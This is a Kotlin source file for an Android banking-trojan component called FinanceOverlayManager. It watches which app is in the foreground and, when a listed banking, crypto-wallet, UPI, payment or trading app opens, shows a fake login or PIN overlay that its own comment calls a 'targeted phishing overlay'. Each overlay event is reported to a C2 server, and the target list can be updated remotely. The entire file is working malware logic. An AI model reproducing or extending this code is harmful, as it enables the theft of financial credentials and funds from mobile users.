package com.xrc.app.finance

import android.util.Log
import com.xrc.app.XRCApp
import com.xrc.app.overlay.SprungeEngine
import org.json.JSONArray
import org.json.JSONObject

/**
 * Manages overlay triggers for financial applications.
 * Monitors foreground app changes and displays targeted phishing overlays.
 */
object FinanceOverlayManager {

    const val TAG = "FinanceOverlayManager"
    private var activeTargets = FinancialTargetList.getAllPackageNames()
    private var isMonitoring = false
    private var currentOverlayPackage = ""

    // Improvement 1: Per-target overlay timing
    private val overlayDelayMap = mutableMapOf<String, Long>()

    // Improvement 2: Cooldown to prevent repeated overlays
    private var lastOverlayTime = 0L
    private const val OVERLAY_COOLDOWN_MS = 300000L // 5 minutes

    init {
        activeTargets.forEach { pkg ->
            overlayDelayMap[pkg] = 1000L // 1 second delay by default
        }
    }

    fun isTarget(packageName: String): Boolean {
        return activeTargets.contains(packageName)
    }

    fun getTarget(packageName: String): String? {
        if (activeTargets.contains(packageName)) {
            FinancialTargetList.getTarget(packageName)?.let { target ->
                return target.packageName
            }
            return packageName
        }
        return null
    }

    fun onForegroundAppChanged(packageName: String) {
        if (!isMonitoring) return
        if (currentOverlayPackage == packageName) return

        currentOverlayPackage = packageName

        if (isTarget(packageName)) {
            val now = System.currentTimeMillis()
            if (now - lastOverlayTime < OVERLAY_COOLDOWN_MS) {
                Log.d(TAG, "Overlay cooldown active, skipping $packageName")
                return
            }

            val delay = overlayDelayMap[packageName] ?: 1000L
            kotlinx.coroutines.GlobalScope.launch {
                kotlinx.coroutines.delay(delay)
                if (currentOverlayPackage == packageName) {
                    showTargetOverlay(packageName)
                }
            }
        }
    }

    private fun showTargetOverlay(packageName: String) {
        val target = FinancialTargetList.getTarget(packageName) ?: return
        val context = XRCApp.instance

        // Choose overlay based on category
        val overlayType = when (target.category) {
            FinancialTargetList.Category.CRYPTO_WALLET,
            FinancialTargetList.Category.CRYPTO_EXCHANGE -> "wallet_login"
            FinancialTargetList.Category.BANKING -> "banking_login"
            FinancialTargetList.Category.PAYMENT -> "payment_login"
            FinancialTargetList.Category.UPI -> "upi_pin"
            FinancialTargetList.Category.NEOBANK -> "banking_login"
            FinancialTargetList.Category.MOBILE_MONEY -> "banking_login"
            FinancialTargetList.Category.INVESTMENT -> "trading_login"
            else -> "generic_login"
        }

        Log.i(TAG, "Showing overlay for $packageName (${target.name}) - type: $overlayType")
        SprungeEngine.showTargetedOverlay(context, packageName)
        lastOverlayTime = System.currentTimeMillis()

        // Notify C2
        val json = JSONObject().apply {
            put("type", "overlay_shown")
            put("package", packageName)
            put("target_name", target.name)
            put("category", target.category.name)
        }
        XRCApp.instance.c2Client.send(json.toString())
    }

    fun updateTargets(targets: JSONArray) {
        val newTargets = mutableListOf<String>()
        for (i in 0 until targets.length()) {
            newTargets.add(targets.optString(i, ""))
        }
        if (newTargets.isNotEmpty()) {
            activeTargets = newTargets
            Log.i(TAG, "Updated targets: ${activeTargets.size} apps")
        }
    }

    fun addTarget(packageName: String) {
        if (!activeTargets.contains(packageName)) {
            activeTargets = activeTargets + packageName
            overlayDelayMap[packageName] = 1000L
            Log.d(TAG, "Added target: $packageName")
        }
    }

    fun removeTarget(packageName: String) {
        activeTargets = activeTargets - packageName
        overlayDelayMap.remove(packageName)
        Log.d(TAG, "Removed target: $packageName")
    }

    fun setOverlayDelay(packageName: String, delayMs: Long) {
        overlayDelayMap[packageName] = delayMs
    }

    fun startMonitoring() {
        isMonitoring = true
        Log.i(TAG, "Finance overlay monitoring started (${activeTargets.size} targets)")
    }

    fun stopMonitoring() {
        isMonitoring = false
        currentOverlayPackage = ""
        Log.i(TAG, "Finance overlay monitoring stopped")
    }

    fun isMonitoringActive(): Boolean = isMonitoring

    fun getActiveTargetCount(): Int = activeTargets.size

    fun getTargetInfo(packageName: String): String? {
        return FinancialTargetList.getTarget(packageName)?.let { target ->
            JSONObject().apply {
                put("package", target.packageName)
                put("name", target.name)
                put("category", target.category.name)
                put("requires_otp", target.requiresOTP)
                put("has_black_screen", target.hasBlackScreen)
                put("region", target.region)
            }.toString()
        }
    }
}
